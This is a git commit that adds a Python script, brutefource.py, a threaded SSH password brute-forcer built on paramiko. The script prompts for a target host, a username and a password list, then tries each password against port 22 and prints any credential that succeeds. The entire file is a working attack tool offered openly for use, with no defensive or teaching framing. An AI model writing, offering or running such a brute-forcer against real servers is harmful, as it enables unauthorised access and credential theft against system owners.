cdfd682505e8c7eac9b14563b87ccafb0435313c
Venu-exe <rvenugopal152007@gmail.com>
2026-05-30 15:28:14 +0530

    added bruteforce and gitignore

---
+++ brutefource.py
@@ -0,0 +1,38 @@
+import paramiko,sys,os,socket,termcolor
+import time,threading
+
+stop_flag = 0
+
+def ssh_connect(password,code=0):
+    global stop_flag
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    try:
+        ssh.connect(host, port=22, username=username, password=password)
+        stop_flag = 1
+        print(termcolor.colored(f'[+] Password Found: {password} For Account: {username}', 'green'))
+    except:
+        print(termcolor.colored(f'[-] Incorrect Password {password}', 'red'))
+    finally:
+        ssh.close()
+
+host = input('[+] Target Address: ').strip()
+username = input('[+] Ssh Username: ').strip()
+input_file = input('[+] Password File: ').strip()
+print('\n')
+
+if os.path.exists(input_file) == False:
+    print(termcolor.colored(f'[-] File {input_file} Not Exist' , 'red'))
+    sys.exit(1)
+
+print(f'* * * Starting Threaded Ssh Burtefource on: {host} With Account: {username} * * * \n ')
+
+with open(input_file,'r') as file:
+    for line in file.readlines():
+        if stop_flag == 1:
+            t.join()
+            exit()
+        password = line.strip()
+        t = threading.Thread(target=ssh_connect, args=(password,))
+        t.start()
+        time.sleep(0.5)
